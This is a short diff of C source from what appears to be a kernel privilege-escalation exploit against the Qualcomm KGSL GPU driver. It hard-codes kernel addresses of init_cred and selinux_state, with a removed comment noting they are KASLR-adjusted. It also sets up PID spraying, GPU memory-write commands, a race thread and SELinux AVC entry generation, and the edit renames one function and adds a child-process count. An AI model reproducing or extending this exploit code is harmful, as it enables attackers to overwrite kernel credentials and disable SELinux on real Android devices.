@@ -83,12 +83,12 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* 成功時の固定アドレス（KASLR オフセット適用済み） */
 #define FIXED_INIT_CRED      0xFFFFFFEE87D97D08ULL
 #define FIXED_SELINUX_STATE  0xFFFFFFEEB3A3A000ULL
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
+#define N_AVC_CHILD 10
 
 #define CP_NOP 0x10
 #define CP_MEM_WRITE 0x3D
@@ -110,7 +110,7 @@ int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target);
 int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts);
 void *race_thread(void *arg);
 void flush_cpu_cache(void *start, size_t len);
-void gen_avc_entries_enhanced(void);
+void gen_avc_entries(void);
 void dump_avc_page(uint64_t va, uint32_t *d, int n_slots);
 int main(int argc, char **argv);
 
